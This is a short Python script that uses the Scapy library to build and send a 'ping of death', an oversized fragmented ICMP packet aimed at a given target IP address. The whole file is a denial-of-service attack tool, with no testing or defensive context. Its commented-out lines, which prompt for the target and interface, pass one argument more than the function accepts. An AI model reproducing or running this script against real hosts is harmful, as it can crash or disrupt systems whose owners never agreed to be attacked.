
from scapy.all import *

def ping_of_death(dst_ip):
    pkt = fragment(IP(dst=dst_ip)/ICMP()/("X"*65507))
    sr1(pkt,iface='eth1',verbose=1,timeout=1)

#dst_ip = raw_input("dst_ip:")
#send_eth = raw_input("send_eth:")
#run_it = ping_of_death(dst_ip,send_eth)

